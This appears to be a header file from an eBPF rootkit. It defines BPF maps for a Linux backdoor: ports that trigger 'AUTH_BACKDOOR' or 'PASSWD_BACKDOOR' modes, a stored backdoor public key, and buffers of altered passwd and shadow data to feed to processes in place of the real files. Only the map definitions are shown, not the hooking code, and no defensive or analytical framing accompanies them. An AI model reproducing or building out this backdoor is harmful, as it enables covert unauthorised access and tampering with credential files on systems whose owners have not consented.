#pragma once
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_endian.h>

#define AUTH_BACKDOOR 1
#define PASSWD_BACKDOOR 2
/*
    User defined variables
*/

// Ports to trigger backdoor
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8);
    __type(key, unsigned short);
    __type(value, int); // 1: AUTH_BACKDOOR, 2: PASSWD_BACKDOOR
} trigger_ports SEC(".maps");


/*
    Backdoor auth key
*/
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1);
    __type(key, int); // 0
    __type(value, char[256]); // backdoor public key
} auth_elem SEC(".maps");

/*
    altered passwd data
*/
struct passwd_block {
    char buff[8192];
    int buff_len;
};
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1);
    __type(key, int); // 0
    __type(value, struct passwd_block);
} passwd_elem SEC(".maps");
/*
    altered shadow data
*/
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1);
    __type(key, int); // 0
    __type(value, char[65536]); 
} shadow_elem SEC(".maps");